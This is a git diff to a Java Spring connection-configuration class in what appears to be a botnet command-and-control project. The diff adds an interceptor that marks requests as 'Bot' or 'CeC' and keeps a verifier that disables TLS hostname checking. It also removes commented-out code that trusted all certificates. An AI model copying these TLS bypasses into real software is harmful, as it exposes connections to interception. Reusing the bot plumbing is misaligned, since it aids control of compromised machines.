@@ -1,10 +1,12 @@
 package cs.sii.service.connection;
 
+import java.io.IOException;
 import java.security.KeyManagementException;
 import java.security.KeyStoreException;
 import java.security.NoSuchAlgorithmException;
 import java.security.cert.X509Certificate;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.List;
 
 import javax.net.ssl.HostnameVerifier;
@@ -25,7 +27,12 @@ import org.apache.http.ssl.SSLContextBuilder;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.context.annotation.Bean;
 import org.springframework.context.annotation.Configuration;
+import org.springframework.http.HttpHeaders;
+import org.springframework.http.HttpRequest;
 import org.springframework.http.MediaType;
+import org.springframework.http.client.ClientHttpRequestExecution;
+import org.springframework.http.client.ClientHttpRequestInterceptor;
+import org.springframework.http.client.ClientHttpResponse;
 import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
 import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
 import org.springframework.web.client.RestTemplate;
@@ -41,38 +48,8 @@ public class ConnectionServiceConfig {
 	@Bean
 	public MySSLClientHttpRequestFactory HttpRequestFactory()
 			throws KeyManagementException, NoSuchAlgorithmException, KeyStoreException {
-
-		// TrustStrategy acceptingTrustStrategy = (X509Certificate[] chain,
-		// String authType) -> true;
-		//
-		// SSLContext sslContext = org.apache.http.ssl.SSLContexts.custom()
-		// .loadTrustMaterial(null, acceptingTrustStrategy)
-		// .build();
-		//
-		// SSLConnectionSocketFactory csf = new
-		// SSLConnectionSocketFactory(sslContext);
-		//
-		// CloseableHttpClient httpClient = HttpClients.custom()
-		// .setSSLSocketFactory(csf)
-		// .build();
-
-		// SSLConnectionSocketFactory socketFactory = new
-		// SSLConnectionSocketFactory(new
-		// SSLContextBuilder().loadTrustMaterial(null, new
-		// TrustSelfSignedStrategy()).build());
-
-//		 HttpClient httpClient = HttpClients.custom().setSSLSocketFactory(socketFactory).build();
-
-		// ((HttpComponentsClientHttpRequestFactory)
-		// template.getRequestFactory()).setHttpClient(httpClient);
 		NullHostnameVerifier verifier=new NullHostnameVerifier();
-		
 		MySSLClientHttpRequestFactory crf = new MySSLClientHttpRequestFactory(verifier);
-		
-//		HttpComponentsClientHttpRequestFactory crf = new HttpComponentsClientHttpRequestFactory();
-
-//		crf.setHttpClient(httpClient);
-		
 		crf.setConnectTimeout(configEngine.getConnectTimeout());
 //		crf.setConnectionRequestTimeout(configEngine.getRequestTimeout());
 		crf.setReadTimeout(configEngine.getReadTimeout());
@@ -82,15 +59,6 @@ public class ConnectionServiceConfig {
 	
 	}
 
-//	@Bean
-//	private static HttpComponentsClientHttpRequestFactory useApacheHttpClientWithSelfSignedSupport() {
-//		CloseableHttpClient httpClient = HttpClients.custom().setSSLHostnameVerifier(new NoopHostnameVerifier()).build();
-//		HttpComponentsClientHttpRequestFactory useApacheHttpClient = new HttpComponentsClientHttpRequestFactory();
-//		useApacheHttpClient.setHttpClient(httpClient);
-//		return useApacheHttpClient;
-//	}
-
-	
 	@Bean
 	public RestTemplate RestTemplate() throws KeyManagementException, NoSuchAlgorithmException, KeyStoreException {
 
@@ -98,11 +66,27 @@ public class ConnectionServiceConfig {
 
 		List<MediaType> mediaTypes = new ArrayList<MediaType>();
 		mediaTypes.add(MediaType.TEXT_PLAIN);
-
+		restTemplate.setInterceptors(Collections.singletonList(new XUserAgentInterceptor()));
 		MappingJackson2HttpMessageConverter mc = new MappingJackson2HttpMessageConverter();
 		mc.setSupportedMediaTypes(mediaTypes);
 		restTemplate.getMessageConverters().add(mc);
 		return restTemplate;
 	}
 
+	
+	public class XUserAgentInterceptor implements ClientHttpRequestInterceptor {
+
+	    @Override
+	    public ClientHttpResponse intercept(
+	            HttpRequest request, byte[] body, ClientHttpRequestExecution execution)
+	            throws IOException {
+
+	        HttpHeaders headers = request.getHeaders();
+	    	if (!configEngine.isCommandandconquerStatus()) {
+	        headers.add("X-User-Agent", "Bot");}
+	    	else  headers.add("X-User-Agent", "CeC");
+	        
+	        return execution.execute(request, body);
+	    }
+	}
 }
